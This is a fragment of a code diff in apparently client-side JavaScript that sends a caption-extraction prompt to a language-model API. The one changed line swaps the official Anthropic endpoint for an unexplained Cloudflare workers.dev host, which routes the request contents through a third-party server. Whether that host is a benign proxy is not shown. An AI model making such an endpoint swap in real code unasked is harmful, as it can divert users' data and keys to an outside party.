@@ -589,7 +589,7 @@ Return ONLY valid JSON, no markdown, no preamble:
 Important: include complete captions with ALL emojis and hashtags. Skip non-post slides (cover page, grid view, feedback slides).`;
 
   try {
-    const res = await fetch('https://api.anthropic.com/v1/messages', {
+    const res = await fetch('https://dark-rain-9ad1.accounts-980.workers.dev/', {
       method : 'POST',
       headers: {
         'Content-Type'                            : 'application/json',
